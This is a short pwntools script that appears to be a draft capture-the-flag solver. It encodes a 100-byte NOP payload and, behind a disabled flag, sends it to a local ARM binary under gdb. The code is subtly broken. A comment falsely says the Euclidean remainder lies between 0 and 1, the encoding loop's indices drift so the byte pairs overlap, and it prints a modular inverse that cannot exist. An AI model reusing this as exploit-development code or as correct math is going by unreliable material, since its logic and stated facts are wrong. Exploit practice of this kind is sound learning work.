#!/bin/python3
from pwn import *
EXPLOIT = 0
# if a = b * q + r and b is not 0
# then gcd(a,b) = gcd(b,r) where is q is an integer, and r is an integer
# between 0 and 1

def modular_inverse(mod, a):
    for x in range(1, mod):
        if (((a % mod) * (x % mod)) % mod == 1):
            return x
    return -1


nop = asm('nop')
payload = nop * 100
input_len = len(payload)
i = 0
j = 0
dst = []
print(modular_inverse(32,0x90))
if input_len % 2 == 0:
    while j < input_len:
        dst.append((payload[i] % 32 + 9) % 25 * 16 + (payload[i + 1] % 32 + 9) % 25)
        j += 2
        i += 1
print(payload)
print(dst)
if EXPLOIT:
    context.update(arch='arm',os='linux',bits='32')
    context.terminal = ['tmux', 'new-window']
    e = ELF('chal')
    io = gdb.debug('./chal', '''
    break main
    b*0x00010ad0
    ''')
    io.recv()
    io.sendline(payload)
    io.recvall()
    io.interactive()
